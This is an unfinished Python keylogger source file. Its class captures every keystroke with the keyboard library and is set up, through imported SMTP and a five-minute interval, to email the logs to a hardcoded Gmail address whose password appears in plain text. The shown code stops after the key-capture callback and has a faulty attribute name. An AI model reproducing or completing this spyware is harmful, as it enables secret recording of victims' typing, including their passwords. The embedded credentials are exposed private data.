import email #Imported to handle email addresses
import keyboard #Imported to provide the ability to log keys
import smtplib #Imported to provide the ability to send the recorded key logs though SMTP protocol for email

from threading import Timer #Intended to make it possible to send reports have a set period of time
from datetime import datetime

#Email Variables for report type of emails
EMAIL = "ph4ntom77projects@gmail.com" #Email that reports are sent to
EMAIL_PW = "Keylogger77!!" #Password for Email

#Time Interval Variable
LOG_INTERVAL = 300 #Every 300 Seconds (5 minutes) a report is sent

class UsbKeylogger:
    def __init__(self, reportInterval, reportType = "file"):
        self.reportInterval = reportInterval
        self.reportType = reportType
        self.startTime = datetime.now() 
        # Used to document the start datetime
        self.endTime = datetime.now() 
        # Used to document the end datetime
        self.keylog = "" 
        # Creates a global string variable named keylog to store the keylogs within. 
        # It will only store the keylogs of the set report interval.

    def callback_Keyboard(self, event):
        eventName = event.eventName
        # Conditional statement to format the appearence of the keylogs in event that they key is not a typical character like a letter or number. 
        # Returns the length of the eventName variable and executes statement if it greater than 1.
        if len(eventName) > 1:
            if eventName == "tab":
                eventName = "[TAB]\t" # Replaces [TAB] with [TAB] and a tab space afterward    
            elif eventName == "enter":
                eventName = "[Enter]\n" # Replaces [ENTER] with [ENTER] and a creates a new line afterward              
            elif eventName == "space":
                eventName = " " # Replaces [SPACE] with " " for readability
            elif eventName == "decimal":
                eventName = "." # Replaces [DECIMAL] with "." for readability
        self.keylog = self.keylog + eventName
    #def __main__(self):
    
